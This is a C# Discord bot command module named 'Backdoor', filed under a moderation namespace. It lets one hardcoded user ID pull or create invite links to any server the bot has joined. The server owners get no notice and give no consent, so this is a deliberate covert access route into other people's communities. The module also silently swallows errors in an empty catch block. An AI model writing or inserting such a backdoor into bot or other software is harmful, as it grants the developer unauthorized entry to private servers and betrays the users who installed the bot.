using System;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

using Discord;
using Discord.Commands;
using Discord.WebSocket;
namespace DiscordBot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildId)
        {
            if(!(Context.User.Id == 306970789180211200))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator");
                return;
            }

            if(Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id=" + GuildId);
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            try
            {
                var Invites = await Guild.GetInvitesAsync();
                if(Invites.Count() < 1)
                {
                    try
                    {
                        await Guild.TextChannels.First().CreateInviteAsync();
                    }
                    catch(Exception ex)
                    {
                        await Context.Channel.SendMessageAsync($" :x: Creating an invite for guild {Guild.Name} went wrong with error ``{ex.Message}``");
                        return;
                    }
                }
                Invites = null;
                Invites = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invite for guild {Guild.Name}", Guild.IconUrl);
                Embed.WithColor(40, 200, 150);

                foreach (var Current in Invites)
                    Embed.AddInlineField("Invite", $"[Invite]({Current.Url})");

                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
            catch (Exception ex)
            {

            }
        }
    }
}
